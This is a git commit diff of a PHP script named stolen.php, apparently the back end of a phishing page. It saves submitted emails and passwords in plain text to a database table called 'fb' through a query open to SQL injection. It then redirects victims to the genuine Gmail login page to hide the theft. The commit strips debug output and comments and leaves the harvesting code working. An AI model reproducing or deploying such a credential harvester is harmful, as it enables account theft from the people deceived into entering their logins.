0dafc890b8c6f9608b7a61db053d6c8e805998f8
MavroidisV <mavroidis@hotmail.gr>
2016-07-10 11:05:48 +0100

    .

--- stolen.php
+++ stolen.php
@@ -1,14 +1,11 @@
 <?php
 
 include("connection.php");
-//check if the user has typed the requirements in the fields
-//in the html we have asked for required fields in first name and last name, but not in php; so with a proxy they can be bypassed;
+
 if(isset($_POST["submit"]))
 {
     $username= $_POST["Email"];
     $password = $_POST["password"];
-echo $username;
-echo $password;
 
 
         $query = mysqli_query($db, "INSERT INTO fb (email, password)VALUES ('$username','$password')")or die(mysqli_error($db));
@@ -17,8 +14,7 @@ echo $password;
             header("location: https://accounts.google.com/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1");
 
         } else echo "Enter again your credentials";
-
-   //
+    
 }
     
 ?>
